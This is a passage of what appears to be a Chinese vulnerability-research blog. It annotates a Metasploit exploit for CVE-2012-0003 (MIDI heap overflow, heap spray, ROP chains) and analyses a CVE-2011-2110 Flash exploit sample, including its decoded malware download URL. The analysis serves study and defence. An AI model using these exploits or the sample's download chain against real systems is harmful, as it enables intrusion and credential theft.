datastore[&#x27;MSHTML&#x27;]    when &#x27;8.0.6001.18702&#x27;      @offset = 0xbf190    when &#x27;8.0.6001.19120&#x27;      @offset = 0xd92c8    end    super  end  def get_target(request)  #* 根据 UA 识别浏览器类型以返回对应目标的 ROP 配置    agent = request.headers[&#x27;User-Agent&#x27;]    print_status(&quot;Request as: #&#123;agent&#125;&quot;)    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/      #Windows XP SP3 + IE 6.0      return targets[1]    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/      #Windows XP SP3 + IE 7.0      return targets[2]    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/      #Windows XP SP3 + IE 8.0      return targets[3]    else      return nil    end  end  # stage =&gt; &quot;corruption&quot; (default) | &quot;leak&quot;  def get_midi(stage=&quot;corruption&quot;)    # MIDI Fileformat Reference:    # http://www.sonicspot.com/guide/midifiles.html    #    # Event Types:    # 0x08 = Note Off (when MIDI key is released)    # 0x09 = Note On (when MIDI key is pressed)    # 0x0A = Note aftertouch (pressure change on the pressed MIDI key)    # 0x0B = Controller Event (MIDI channels state)    # 0x0C = Program change (Which instrument/patch should be played on the MIDI channel)    # 0x0D = Channel aftertouch (similar to Note Aftertouch; effects all keys pressed on the specific MIDI channel)    # 0x0E = Pitch Bend (similiar to a controller event; has 2 bytes to describe its value)    # 0x0F = Meta Events (not sent or received over a midi port)    # Structure:    # [Header Chunk][Track Chunk][Meta Event][Meta Event][SYSEX Event][Midi Channel Event)    # Track Chunk Data    tc = &quot;\\x00\\xFF\\x03\\x0D\\x44\\x72\\x75\\x6D&quot;    # Meta Event - Sequence/Track Name    tc &lt;&lt; &quot;\\x73\\x20\\x20\\x20\\x28\\x42\\x42\\x29\\x00&quot;    # Midi Channel Event - Program Change    tc &lt;&lt; &quot;\\x00\\xC9\\x28&quot;    # Midi Channel Event - Controller    tc &lt;&lt; &quot;\\x00\\xB9\\x07\\x64&quot;    # Midi Channel Event - Controller    tc &lt;&lt; &quot;\\x00\\xB9\\x0A\\x40&quot;    # Midi Channel Event - Controller    tc &lt;&lt; &quot;\\x00\\xB9\\x7B\\x00&quot;    # Midi Channel Event - Controller    tc &lt;&lt; &quot;\\x00\\xB9\\x5B\\x28&quot;    # Midi Channel Event - Controller    tc &lt;&lt; &quot;\\x00\\xB9\\x5D\\x00&quot;    # Midi Channel Event - Note On    tc &lt;&lt; &quot;\\x85\\x50\\x99\\x23\\x7F&quot;    # Corruption events    if stage == &quot;corruption&quot;      # Midi Channel Event - Note On      tc &lt;&lt; &quot;\\x00\\x9F\\xb2\\x73&quot;    else      # Midi Channel Event - Note Off (trigger a leak)      tc &lt;&lt; &quot;\\x00\\x8F\\xb2\\x73&quot;    end    # Meta Event - End Of Track    tc &lt;&lt; &quot;\\x00\\xFF\\x2F\\x00&quot;    m = &#x27;&#x27;    # HEADERCHUNK Header    m &lt;&lt; &quot;MThd&quot;                 # Header    m &lt;&lt; &quot;\\x00\\x00\\x00\\x06&quot;     # Chunk size    m &lt;&lt; &quot;\\x00\\x00&quot;             # Format Type    m &lt;&lt; &quot;\\x00\\x01&quot;             # Number of tracks    m &lt;&lt; &quot;\\x00\\x60&quot;             # Time division    # TRACKCHUNK header    m &lt;&lt; &quot;MTrk&quot;                 # Header    m &lt;&lt; [tc.length].pack(&#x27;N&#x27;)    m &lt;&lt; tc    #midi_name = &quot;test_case.mid&quot;    midi_name = rand_text_alpha(5) + &quot;.mid&quot;    return midi_name, m  end  def on_request_uri(cli, request)  #* Web Server 的路由函数    # Initialize a target.  If none suitable, then we don&#x27;t continue.    my_target = target    if my_target.name =~ /Automatic/      my_target = get_target(request)      agent = request.headers[&#x27;User-Agent&#x27;]      if my_target.nil? and agent !~ /Windows\\-Media\\-Player|NSPlayer/        send_not_found(cli)        print_error(&quot;Unknown user-agent&quot;)        return      end      vprint_status(&quot;Target selected: #&#123;my_target.name&#125;&quot;) if not my_target.nil?    end    # Send the corrupt midi file to trigger a memory leak, or a crash to that points    # to an arbitrary address.    if request.uri =~ /#&#123;@ml_name&#125;$/i      print_status(&quot;Testing for info leak...&quot;)      send_response(cli, @midi_leak, &#123;&#x27;Content-Type&#x27;=&gt;&#x27;application/octet-strem&#x27;&#125;)      return    elsif request.uri =~ /#&#123;@m_name&#125;$/i      print_status(&quot;Sending midi corruption file...&quot;)      send_response(cli, @midi, &#123;&#x27;Content-Type&#x27;=&gt;&#x27;application/octet-strem&#x27;&#125;)      return    end    # Send the appropriate stage    if datastore[&#x27;MSHTML&#x27;].to_s != &#x27;&#x27; and my_target[&#x27;Rop&#x27;]      if request.uri =~ /#&#123;@second_stage_url&#125;/        leak = begin          request.uri_parts[&quot;QueryString&quot;][@leak_param].to_i        rescue          0        end        print_status(&quot;Leaked address: 0x#&#123;leak.to_s(16)&#125;&quot;)        send_stage(cli, my_target, &#x27;trigger&#x27;, leak)        return      end      send_stage(cli, my_target, &#x27;leak&#x27;)    else      send_stage(cli, my_target)    end  end  def send_stage(cli, my_target, stage=&#x27;trigger&#x27;, leak=0)  #* 构造并发送包含漏洞触发代码的 HTML 页面    midi_uri = get_resource.chomp(&quot;/&quot;)    if stage == &#x27;leak&#x27;      midi_uri &lt;&lt; &quot;/#&#123;@ml_name&#125;&quot;      trigger = build_trigger(my_target, &quot;leak&quot;)    else      midi_uri &lt;&lt; &quot;/#&#123;@m_name&#125;&quot;      trigger  = build_trigger(my_target)      spray    = build_spray(my_target, leak)    end    if datastore[&#x27;OBFUSCATE&#x27;]      spray   = ::Rex::Exploitation::JSObfu.new(spray).obfuscate(memory_sensitive: true)      trigger = ::Rex::Exploitation::JSObfu.new(trigger)      trigger.obfuscate(memory_sensitive: true)      trigger_fn = trigger.sym(&#x27;trigger&#x27;)    else      trigger_fn = &#x27;trigger&#x27;    end    html = %Q|    &lt;html&gt;    &lt;head&gt;    &lt;script language=&#x27;javascript&#x27;&gt;    #&#123;spray&#125;    &lt;/script&gt;    &lt;script language=&#x27;javascript&#x27;&gt;      #&#123;trigger&#125;    &lt;/script&gt;    &lt;script for=audio event=PlayStateChange(oldState,newState)&gt;      if (oldState == 3 &amp;&amp; newState == 0) &#123;        #&#123;trigger_fn&#125;();      &#125;    &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;      &lt;object ID=&quot;audio&quot; WIDTH=1 HEIGHT=1 CLASSID=&quot;CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95&quot;&gt;        &lt;param name=&quot;fileName&quot; value=&quot;#&#123;midi_uri&#125;&quot;&gt;        &lt;param name=&quot;SendPlayStateChangeEvents&quot; value=&quot;true&quot;&gt;        &lt;param NAME=&quot;AutoStart&quot; value=&quot;True&quot;&gt;        &lt;param name=&quot;uiMode&quot; value=&quot;mini&quot;&gt;        &lt;param name=&quot;Volume&quot; value=&quot;-300&quot;&gt;      &lt;/object&gt;    &lt;/body&gt;    &lt;/html&gt;    |    html = html.gsub(/^ &#123;4&#125;/, &#x27;&#x27;)    print_status(&quot;Sending html to #&#123;cli.peerhost&#125;:#&#123;cli.peerport&#125;...&quot;)    send_response(cli, html, &#123;&#x27;Content-Type&#x27;=&gt;&#x27;text/html&#x27;&#125;)  end  def build_spray(my_target, leak=0)  #* 生成 Heap Spray 代码以布置 Shellcode    # Extract string based on target    if my_target.name == &#x27;IE 8 on Windows XP SP3&#x27;      js_extract_str = &quot;var block = shellcode.substring(2, (0x40000-0x21)/2);&quot;    else      js_extract_str = &quot;var block = shellcode.substring(0, (0x80000-6)/2);&quot;    end    # Build shellcode based on Rop requirement    code = &#x27;&#x27;    if my_target[&#x27;Rop&#x27;] and datastore[&#x27;MSHTML&#x27;].to_s != &#x27;&#x27;      print_status(&quot;Generating ROP using info-leak: 0x#&#123;leak.to_s(16)&#125;&quot;)      code &lt;&lt; create_info_leak_rop(my_target, leak)      code &lt;&lt; payload.encoded    elsif my_target[&#x27;Rop&#x27;] and datastore[&#x27;MSHTML&#x27;].to_s == &#x27;&#x27;      print_status(&quot;Generating ROP using msvcrt&quot;)      code &lt;&lt; create_rop(my_target, payload.encoded)    else      code &lt;&lt; payload.encoded    end    shellcode = Rex::Text.to_unescape(code)    randnop = rand_text_alpha(rand(100) + 1)    js_nops = Rex::Text.to_unescape(&quot;\\x0c&quot;*4)    # 1. Create  big block of nops    # 2. Compose one block which is nops + shellcode    # 3. Repeat the block    # 4. Extract string from the big block    # 5. Spray    spray = &lt;&lt;-JS    var heap_obj = new heapLib.ie(0x10000);    var code = unescape(&quot;#&#123;shellcode&#125;&quot;);    var #&#123;randnop&#125; = &quot;#&#123;js_nops&#125;&quot;;    var nops = unescape(#&#123;randnop&#125;);    while (nops.length &lt; 0x1000) nops+= nops;    var shellcode =  nops.substring(0,0x800 - code.length) + code;    while (shellcode.length &lt; 0x40000) shellcode += shellcode;    #&#123;js_extract_str&#125;    heap_obj.gc();    for (var i=0; i &lt; 600; i++) &#123;      heap_obj.alloc(block);    &#125;    JS    spray = heaplib(spray, &#123;:noobfu =&gt; true&#125;)    return spray  end  # Build the JavaScript string for the attributes  # type =&gt; &quot;corruption&quot; (default) | &quot;leak&quot;  def build_element(element_name, my_target, type=&quot;corruption&quot;)  #* 创建带有多个属性（使得创建的对象大小与堆溢出 Chunk 的大小一致）的 HTML 元素以操控堆布局    dst = Rex::Text.to_unescape([my_target[&#x27;DispatchDst&#x27;]].pack(&quot;V&quot;))    element = &#x27;&#x27;    if my_target.name =~ /IE 8/      max   = 63   # Number of attributes for IE 8      index = 1    # Where we want to confuse the type    else      max   = 55   # Number of attributes for before IE 8      index = 0    # Where we want to confuse the type    end    element &lt;&lt; &quot;var #&#123;element_name&#125; = document.createElement(\\&quot;select\\&quot;)&quot; + &quot;\\n&quot;    # Build attributes    0.upto(max) do |i|      case type        when &quot;corruption&quot;          obj = (i==index) ? &quot;unescape(\\&quot;#&#123;dst&#125;\\&quot;)&quot; : &quot;alert&quot;        else #leak          obj = &quot;alert&quot;      end      element &lt;&lt; &quot;#&#123;element_name&#125;.w#&#123;i.to_s&#125; = #&#123;obj&#125;&quot; + &quot;\\n&quot;    end    return element  end  # Feng Shui and triggering Steps:  # 1. Run the garbage collector before allocations  # 2. Defragment the heap and alloc CImplAry objects in one step (objects size are IE version dependent)  # 3. Make holes  # 4. Let windows media play the crafted midi file and corrupt the heap  # 5. Force the using of the confused tagVARIANT.  def build_trigger(my_target, type=&quot;corruption&quot;)  #* 大量创建和删除 DOM 元素制造堆块碎片以构造堆风水,触发 MIDI 播放以执行堆溢出    js_trigger = build_trigger_fn(my_target, type)    select_element = build_element(&#x27;selob&#x27;, my_target, type)    trigger = &lt;&lt;-JS      var heap = new heapLib.ie();      #&#123;select_element&#125;      var clones = new Array(1000);      function feng_shui() &#123;        heap.gc();        var i = 0;        while (i &lt; 1000) &#123;          clones[i] = selob.cloneNode(true)          i = i + 1;        &#125;        var j = 0;        while (j &lt; 1000) &#123;          delete clones[j];          CollectGarbage();          j  = j + 2;        &#125;      &#125;      feng_shui();      #&#123;js_trigger&#125;    JS    trigger = heaplib(trigger, &#123;:noobfu =&gt; true&#125;)    return trigger  end  # type = &quot;corruption&quot; (default) | &quot;leak&quot;  def build_trigger_fn(my_target, type=&quot;corruption&quot;)  #* 漏洞出发逻辑的具体实现    js_trigger= &quot;&quot;    case type      when &quot;corruption&quot;        js_trigger = js_trigger_fn_corruption(my_target)      when &quot;leak&quot;        js_trigger = js_trigger_fn_leak(my_target)    end    return js_trigger  end  # Redoing the feng shui if fails makes it reliable  def js_trigger_fn_corruption(my_target)  #* 漏洞出发逻辑的具体实现    attribute = (my_target.name == &#x27;IE 8 on Windows XP SP3&#x27;) ? &#x27;w1&#x27; : &#x27;w0&#x27;    js = %Q|    function trigger()&#123;      var k = 999;      while (k &gt; 0) &#123;        if (typeof(clones[k].#&#123;attribute&#125;) == &quot;string&quot;) &#123;        &#125; else &#123;          clones[k].#&#123;attribute&#125;(&#x27;come on!&#x27;);        &#125;        k = k - 2;      &#125;      feng_shui();      document.audio.Play();    &#125;    |    return js  end  # Redoing the feng shui if fails makes it reliable  def js_trigger_fn_leak(my_target)  #* 漏洞出发逻辑的具体实现    js_trigger = &quot;&quot;    if my_target.name == &#x27;IE 8 on Windows XP SP3&#x27;      js_trigger = &lt;&lt;-JSTRIGGER      function trigger()&#123;        var k = 999;        while (k &gt; 0) &#123;          if (typeof(clones[k].w1) == &quot;string&quot;) &#123;            var leak = clones[k].w1.charCodeAt(1)*0x10000 + clones[k].w1.charCodeAt(0)            document.location = &quot;#&#123;get_resource.chomp(&quot;/&quot;)&#125;/#&#123;@second_stage_url&#125;&quot; + &quot;?#&#123;@leak_param&#125;=&quot; + leak            return;          &#125;          k = k - 2;        &#125;        feng_shui();        document.audio.Play();      &#125;      JSTRIGGER    end    return js_trigger  end  def create_rop(t, p)  #* 生成 ROP 链绕过 DEP/ASLR    # MSVCRT.dll ROP    padding = &#x27;&#x27;    padding &lt;&lt; [0x77C4CA70].pack(&quot;V*&quot;)        #ADD ESP,0C; RET    padding &lt;&lt; [t[&#x27;StackPivot&#x27;]].pack(&quot;V*&quot;)    padding &lt;&lt; [0x77C4CA73].pack(&quot;V*&quot;) * 12   #ROP NOPs    generate_rop_payload(&#x27;msvcrt&#x27;, p, &#123;&#x27;pivot&#x27;=&gt;padding, &#x27;target&#x27;=&gt;&#x27;xp&#x27;&#125;)  end  def create_info_leak_rop(my_target, leak = 0x0)  #* 生成 ROP 链绕过 DEP/ASLR    base = (leak == 0x00) ? 0x63580000 : (leak - @offset)    print_status(&quot;Image base of mshtml: 0x%x&quot; %base)    # Generate the gadgets based on offset    rop_gadgets = &#x27;&#x27;    case @offset    when 0xd92c8      rop_gadgets =      [        :junk,        :junk,        0x328468,   # push ecx # pop esp # pop edi # pop esi # pop ebp # retn 14        :junk,        0x247e5d,   # ROP NOPs        0x247e5d,        0x247e5d,        0x247e5d,        0x247e5d,        0x247e5d,        0x247e5d,        0x247e5c,   # POP ESI # RETN [mshtml.dll]        0x137c,     # ptr to &amp;VirtualProtect() [IAT mshtml.dll]        0x3c8db7,   # MOV EDX,DWORD PTR DS:[ESI] # ADD EAX,8BCE8B00 # RETN [mshtml.dll]        0x42e239,   # PUSH EDX # XOR EAX,EAX # POP ESI # POP EBP # RETN 0x08 [mshtml.dll]        :junk,        0x3460c,    # POP EBP # RETN [mshtml.dll]        :junk,        :junk,        0x23ef79,   # &amp; jmp esp [mshtml.dll]        0x189303,   # POP EBX # RETN [mshtml.dll]        :ebx,       # 0x00000201-&gt; ebx        0x20437c,   # POP EDX # RETN [mshtml.dll]        :edx,       # 0x00000040-&gt; edx        0xc277,     # POP ECX # RETN [mshtml.dll]        0x53a47d,   # &amp;Writable location [mshtml.dll]        0x4a33e2,   # POP EDI # RETN [mshtml.dll]        0x4b601,    # RETN (ROP NOP) [mshtml.dll]        0x33fbc6,   # POP EAX # RETN [mshtml.dll]        :nop,        0x52c718    # PUSHAD # RETN [mshtml.dll]      ]    when 0xbf190      rop_gadgets =      [        :junk,        0x3338ae,  # push ecx # pop esp # pop edi # pop esi # pop ebp # retn 14        :junk,        0xe9e7,    # POP ECX # RETN [mshtml.dll] 0x6358e9e7        :junk,        :junk,        :junk,        :junk,        :junk,        0x1318,     # ptr to &amp;VirtualProtect() [IAT mshtml.dll]        0x48b440,   # MOV EDX,DWORD PTR DS:[ECX] # RETN [mshtml.dll]        0x3dc745,   # POP ESI # RETN [mshtml.dll]        :neg,       # 0xffffffff        0x2fb18b,   # INC ESI # RETN [mshtml.dll]        0x35190d,   # ADC ESI,EDX # DEC ECX # RETN 08 [mshtml.dll]        0x4aada7,   #  POP EBP # RETN [mshtml.dll]        :junk,      # Compensates RETN        :junk,      # Compensates RETN        0x1ffc54,   # &amp; jmp esp [mshtml.dll]        0x4498a7,   # POP EBX # RETN [mshtml.dll]        :ebx,       # 0x00000800: 0x00000201-&gt; ebx        0x24cce4,   # POP EDX # RETN [mshtml.dll]        :edx,       # 0x00000040-&gt; edx        0x158306,   # POP ECX # RETN [mshtml.dll]        0x535098,   # &amp;Writable location [mshtml.dll]        0x1cf217,   # POP EDI # RETN [mshtml.dll]        0xa0001,    # RETN (ROP NOP) [mshtml.dll]        0x349f9b,   # POP EAX # RETN [mshtml.dll]        :nop,        0x2afbe8    # PUSHAD # RETN [mshtml.dll]      ]    end    nops = make_nops(4).unpack(&quot;L&quot;)[0].to_i    rop_gadgets.map! &#123; |e|      if e == :junk        rand_text(4).unpack(&quot;L&quot;)[0].to_i      elsif e == :neg        0xffffffff      elsif e == :ebx        0x00000800      elsif e == :edx        0x00000040      elsif e == :nop        nops      else        base + e      end    &#125;    chain = rop_gadgets.pack(&#x27;V*&#x27;)    return chain  endend\n\n漏洞利用程序的入口是 exploit 方法,它将调用 get_midi 方法生成用于堆破坏和信息泄露的 MIDI 文件,根据 MSHTML 选项设置用于构造 ROP 链的偏移量,并调用父类的 exploit 方法。\nget_midi 方法将构造 MIDI 头部和音轨数据块,同时根据 stage 参数插入不同的事件————如果 stage 为 corruption 则插入 Note On 事件触发堆溢出,为 leak 则插入 Note Off 事件触发信息泄露————随后返回随机命名的恶意 MIDI 文件及其二进制内容以用于触发漏洞\n其余函数则与 Web Server 的工作有关,例如根据请求的 UA 头识别攻击目标的浏览器类型以生成对应的 payload,根据选择的 stage 执行不同的漏洞触发逻辑 JS 代码或 ROP 代码,其中非常值得一提的是与操控堆布局有关的 build_elment 函数和 build_trigger 函数,为什么要执行这样的 JS 代码可参见Advanced Exploitation of Internet Explorer Heap Overflow Vulnerabilities (MS12-004),在此就不过多赘述\n漏洞修复patch 后的 winmm.dll 多了一条 and b1, 7Fh 指令截取音符编号的低 7 位以限制音符编号的大小进而避免了堆溢出的发生\nReferenceNVD - CVE-2012-0003CVE - CVE-2012-0003CVEdetails.com - CVE-2012-0003Microsoft Security Bulletin MS12-004 - CriticalStandard MIDI-File Format Spec. 1.1, updated漏洞战争Advanced Exploitation of Internet Explorer Heap Overflow Vulnerabilities (MS12-004)看雪论坛精华帖\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2011-2110 漏洞研究","url":"/2025/05/25/Vulnerability%20Investigation/CVE-2011-2110%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"2011 年 6 月以韩国为首的国家频繁遭受利用了一个 Adobe Flash 漏洞的网页挂马攻击，该漏洞的利用可导致任意代码执行，并由于影响范围较大并被恶名昭著的 Blackhole Exploit 所使用，在地下黑产中广为流传。\n影响范围：\nAdobe Flash Player before 10.3.181.26 on Windows, Mac OS X, Linux, and Solaris, and 10.3.185.23 and earlier on Android\n漏洞分析调试运行 IE 并打开样本 HTML 文件后程序因触发 Access Violation 异常而崩溃，且崩溃时的代码为 mov eax, dword ptr [ecx+eax*4]，一眼数组越界访问漏洞。和其它的 Flash 漏洞分析思路一样先从样本开始分析，样本 HTML 文件如下\n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; lang=&quot;en-US&quot; xml:lang=&quot;en-US&quot;&gt;    &lt;head&gt;        &lt;title&gt;test&lt;/title&gt;        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;        &lt;style type=&quot;text/css&quot; media=&quot;screen&quot;&gt;        html, body &#123; height:100%; background-color: #ffffff;&#125;        body &#123; margin:0; padding:0; overflow:hidden; &#125;        #flashContent &#123; width:100%; height:100%; &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div id=&quot;flashContent&quot;&gt;            &lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; width=&quot;550&quot; height=&quot;400&quot; id=&quot;test&quot; align=&quot;middle&quot;&gt;                &lt;param name=&quot;movie&quot; value=&quot;main.swf?info=02e6b1525353caa8ad555555ad31b637b436aeb1b631b1ad35b355b5a93534ab51d3527b7ab7387656&quot; /&gt;                &lt;param name=&quot;quality&quot; value=&quot;high&quot; /&gt;                &lt;param name=&quot;bgcolor&quot; value=&quot;#ffffff&quot; /&gt;                &lt;param name=&quot;play&quot; value=&quot;true&quot; /&gt;                &lt;param name=&quot;loop&quot; value=&quot;true&quot; /&gt;                &lt;param name=&quot;wmode&quot; value=&quot;window&quot; /&gt;                &lt;param name=&quot;scale&quot; value=&quot;showall&quot; /&gt;                &lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;                &lt;param name=&quot;devicefont&quot; value=&quot;false&quot; /&gt;                &lt;param name=&quot;salign&quot; value=&quot;&quot; /&gt;                &lt;param name=&quot;allowScriptAccess&quot; value=&quot;sameDomain&quot; /&gt;                &lt;!--[if !IE]&gt;--&gt;                &lt;object type=&quot;application/x-shockwave-flash&quot; data=&quot;main.swf?info=02e6b1525353caa8ad555555ad31b637b436aeb1b631b1ad35b355b5a93534ab51d3527b7ab7387656&quot; width=&quot;550&quot; height=&quot;400&quot;&gt;                    &lt;param name=&quot;movie&quot; value=&quot;main.swf?info=02e6b1525353caa8ad555555ad31b637b436aeb1b631b1ad35b355b5a93534ab51d3527b7ab7387656&quot; /&gt;                    &lt;param name=&quot;quality&quot; value=&quot;high&quot; /&gt;                    &lt;param name=&quot;bgcolor&quot; value=&quot;#ffffff&quot; /&gt;                    &lt;param name=&quot;play&quot; value=&quot;true&quot; /&gt;                    &lt;param name=&quot;loop&quot; value=&quot;true&quot; /&gt;                    &lt;param name=&quot;wmode&quot; value=&quot;window&quot; /&gt;                    &lt;param name=&quot;scale&quot; value=&quot;showall&quot; /&gt;                    &lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;                    &lt;param name=&quot;devicefont&quot; value=&quot;false&quot; /&gt;                    &lt;param name=&quot;salign&quot; value=&quot;&quot; /&gt;                    &lt;param name=&quot;allowScriptAccess&quot; value=&quot;sameDomain&quot; /&gt;                &lt;!--&lt;![endif]--&gt;                    &lt;a href=&quot;http://www.adobe.com/go/getflash&quot;&gt;                        &lt;img src=&quot;http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif&quot; alt=&quot;get Adobe Flash Player&quot; /&gt;                    &lt;/a&gt;                &lt;!--[if !IE]&gt;--&gt;                &lt;/object&gt;                &lt;!--&lt;![endif]--&gt;            &lt;/object&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;&lt;script language=&quot;javascript&quot; src=&quot;http://count23.51yes.com/click.aspx?id=232134399&amp;logo=1&quot; charset=&quot;gb2312&quot;&gt;&lt;/script&gt;\n\n注意到其主要功能为加载 main.swf 文件并传递 info 参数，使用 JPEXS Free Flash Decomiler 反编译 main.swf 文件，得到其核心代码如下\n//* 解析 info 参数var param:Object = root.loaderInfo.parameters;var t_url:ByteArray = this.hexToBin(param[&quot;info&quot;]);i = 0;i = 0;while(i &lt; t_url.length) &#123;  t_url[i] = t_url[i] ^ 122;  i++;&#125;t_url.uncompress();......//* 以 info 参数的解析结果为 URL 进行请求loader = new URLLoader();loader.dataFormat = URLLoaderDataFormat.BINARY;loader.addEventListener(Event.COMPLETE,onLoadComplete);loader.load(new URLRequest(t_url.toString()));.......//* 做漏洞利用的准备onLoadComplete = function(param1:Event):void &#123;  content = loader.data;  i = 0;  while(i &lt; content.length) &#123;    content[i] = content[i] ^ 122;    i++;  &#125;  content.uncompress();  content_len = content.length;  var _loc2_:ByteArray = new ByteArray();  code = _loc2_;  _loc2_.position = 1024 * 1024;  _loc2_.writeInt(2053274210);  _loc2_.writeInt(2053339747);  _loc2_.writeInt(2053405283);  _loc2_.writeObject(_loc2_);  //* 触发漏洞  test();  trace(_loc2_.length);&#125;;\n\n其主要逻辑较为易懂，已在注释中解释。注意到 info 是编码后的恶意文件 URL，对其进行解码\nimport binasciiimport zlibhex_string = &quot;02e6b1525353caa8ad555555ad31b637b436aeb1b631b1ad35b355b5a93534ab51d3527b7ab7387656&quot;binary_string = binascii.unhexlify(hex_string)# print binary_stringres = &quot;&quot;for i in binary_string:  res += chr(ord(i) ^ 122)# print resprint(zlib.decompress(res))\n\n得到\nhttp://www.amcia.info/down/cd.txt\n\n再根据 JS 代码逻辑对该文件进行解密\nimport zlibdata = open(&quot;./cd.txt&quot;, &quot;rb&quot;).read()dec = &quot;&quot;for i in data:  dec += chr(ord(i) ^ 122)file =  zlib.decompress(dec)open(&quot;decode.bin&quot;, &quot;wb&quot;).write(file)\n\n用 ImHex 查看解密结果发现是加壳了的 PE 可执行文件，可以推测这是漏洞触发后小马拉的大马\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 00 00 00 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 D7 B5 A0 42 93 D4 CE 11 93 D4 CE 11 93 D4 CE 11 CA F7 DD 11 91 D4 CE 11 E8 C8 C2 11 92 D4 CE 11 10 C8 C0 11 91 D4 CE 11 FC CB CA 11 97 D4 CE 11 93 D4 CF 11 CC D4 CE 11 50 DB 93 11 9C D4 CE 11 A5 F2 C5 11 97 D4 CE 11 54 D2 C8 11 92 D4 CE 11 52 69 63 68 93 D4 CE 11 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 45 00 00 4C 01 04 00PE32 executable for MS Windows 4.00 (GUI), Intel i386- , PECompact2 compressed, 4 sections\n\n\n上传到在线沙箱后发现是游戏盗号木马\n\n触发漏洞的 test 函数占了样本恶意代码的绝大部分篇幅，\npublic function test(... rest) : void&#123;    var _loc8_:int = 0;    //* 越界索引 rest[0x4000000E] 并接连进行类型转换后赋值给了 _loc2_    var _loc2_:Number = new Number(parseFloat(String(rest[0x4000000E])));    var _loc3_:ByteArray = new ByteArray();    _loc3_.position = 0;    _loc3_.writeDouble(_loc2_); //* 将 _loc2_ 写到了 _loc2_ 数组的首个元素中    //* 通过 _loc3_ 计算出基址并据此构造 ROP 链    var _loc4_:uint = _loc3_[0] * 0x1000000 + _loc3_[1] * 0x10000 + _loc3_[2] * 0x100 + _loc3_[3];    this.baseaddr = _loc4_;    this.code.position = 0;    this.code.endian = Endian.LITTLE_ENDIAN;    this.code.writeInt(this.pobj - 1 + 16 + 409600);    this.code.endian = Endian.BIG_ENDIAN;    this.code.writeUnsignedInt(0x41414141);    this.code.writeUnsignedInt(0x41414141);    this.code.writeUnsignedInt(0x41414141);    _loc8_ = 0;    while(_loc8_ &lt; 102400)    &#123;       this.code.writeUnsignedInt(0x41414141);       _loc8_++;    &#125;  ...  //* 类似的通过数组越界读取基地并构造 ROP 链  var _loc5_:Number = new Number(parseFloat(String(rest[0x3FFFFF96])));  var _loc6_:ByteArray;  (_loc6_ = new ByteArray()).writeDouble(_loc5_);  var _loc7_:uint = _loc6_[0] * 0x1000000 + _loc6_[1] * 0x10000 + _loc6_[2] * 0x100 + _loc6_[3];  this.pobj = _loc7_; //* 第二次信息泄露  _loc8_ = 0;  this.pobj += 56;  _loc8_ = 0;  while(_loc8_ &lt; 100)  &#123;    this.code.writeInt(this.pobj);    _loc8_++;  &#125;  var _loc9_:Number = new Number(parseFloat(String(rest[0x3FFFFFBA])));  _loc3_.position = 0;  _loc3_.writeDouble(_loc9_);  _loc4_ = _loc3_[0] * 0x1000000 + _loc3_[1] * 0x10000 + _loc3_[2] * 0x100 + _loc3_[3];  this.pobj = _loc4_ + 2; //* 第三次信息泄露  ExternalInterface.call(&quot;&quot;,this.pobj.toString(16));  _loc8_ = 0;  while(_loc8_ &lt; 100)  &#123;    this.code.writeInt(this.pobj);    _loc8_++;  &#125;&#125;  ...\n\n注意到三处类似于计算基址的代码，可推测数组越界访问就发生在那三处，修改任意一处的数组索引地址，例如修改第一处的索引值为 0x41414141 并重新编译为 swf 文件开启调试发现 IE 再次因 Access Violation 异常而崩溃，而此时存放数组索引的寄存器 eax 内的值正是 0x41414141，故漏洞发生于此\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2011-2110\n\n搜索结果\nMatching Modules================   #  Name                                                     Disclosure Date  Rank   Check  Description   -  ----                                                     ---------------  ----   -----  -----------   0  exploit/windows/browser/adobe_flashplayer_arrayindexing  2012-06-21       great  No     Adobe Flash Player AVM Verification Logic Array Indexing Code ExecutionInteract with a module by name or index. For example info 0, use 0 or use exploit/windows/browser/adobe_flashplayer_arrayindexing\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/browser/adobe_flashplayer_arrayindexingmsf6 exploit(windows/browser/adobe_flashplayer_arrayindexing) &gt; info\n\n模块详情信息\n       Name: Adobe Flash Player AVM Verification Logic Array Indexing Code Execution     Module: exploit/windows/browser/adobe_flashplayer_arrayindexing   Platform: Windows       Arch:  Privileged: No    License: Metasploit Framework License (BSD)       Rank: Great  Disclosed: 2012-06-21Provided by:  mr_me &lt;steventhomasseeley@gmail.com&gt;  UnknownAvailable targets:      Id  Name      --  ----  =&gt;  0   AutomaticCheck supported:  NoBasic options:  Name     Current Setting  Required  Description  ----     ---------------  --------  -----------  SRVHOST  *******          yes       The local host or network interface to listen on. This must be an address on the local machine or ******* to listen on all addresses.  SRVPORT  8080             yes       The local port to listen on.  SSL      false            no        Negotiate SSL for incoming connections  SSLCert                   no        